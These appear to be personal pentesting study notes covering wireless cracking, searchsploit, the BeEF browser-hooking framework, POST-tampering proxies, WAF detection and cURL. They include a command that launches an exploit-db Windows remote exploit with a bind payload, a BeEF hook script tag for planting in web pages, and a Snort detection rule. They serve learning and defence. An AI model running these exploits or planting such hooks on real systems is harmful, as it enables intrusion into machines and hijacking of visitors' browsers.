## Aircrack-NG

From .pcap file holding wireless transmission data

`aircrack-ng file.pcap`

wireshark can use cracked passcodes to decrypt rest of traffic

## recon-ng

OSSINT tool for CLI

## Searchsploit

offline database of exploit-db

`searchsploit -u` sync to grab latest repo

`searchsploit ftp remote` search for "ftp" **and** "remote" listed in an exploit's title and path

`searchsploit -t ftp remote` search title only

*hint* `searchsploit -t windows | wc -l` count number of returned exploits

`--exclude="name1|name2"` exlude from results

`-w` return URLs of webpage associated with exploit

Read the initial portion of the exploit scripts to understand how to use them

`exploits/windows/remote/43993.py`

`python exploits/windows/remote/43993.py payload=bind rhost=192.168.0.2 rport=1234`

## BeEF - zombie attack on web browsers

`sudo beef-xss`

Javascript entry

`<script src=”http://127.0.0.1:3000/hook.js” type=”text/javascript”></script>`

placed on web page, within the headers section

login to BeEf frontend

`localhost:3000`

- user: beef
- password: ?

Mitigation

browser extensions, like Vegan, detect BeEF hooks and block offending domains

snort rules, looking for cookie identifyers

`alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (flow:to_server,established; content:"Cookie|3a 20|BEEFSESSION=";)`

## Tamper Data

This tool allows to modify/view POST data before it is sent, runs as a browser extension

- Can view Basic Authentication


## WebScarab

Setup a proxy that will take all POST sends, allows to view/modify the POST prior to forwarding to final destination

- FoxyProxy

When client-side security is being employed, this allows to insert forbidden content, outside controls of webcode

Webcode limits password to be less than 8 characters to limit SQLi, webscarab allows to adjust password length at will




## Wafw00f - Web Application Firewall Detection

`wafw00f -a www.example.com`

`-a` aggressive scan

`-v -vv -vvvvv` verbose output


## CyberChef Decoding/Encoding

`gchq.github.io/CyberChef/`

CyberChef decoding

Used to encode phrases, using very common encoding methods
-encoding methods can be strung together to add complexity

Many items are encoded with base64 for robust, simple encoding
- some cookies
- basic authentication

## cURL

`curl example.com` fetch html for a website

`-I` view response headers only

`-v` view request/response text

`--request POST` set request type



## Other firefox addons

- Edit cookies
- Selenium IDE
- View Source Chart
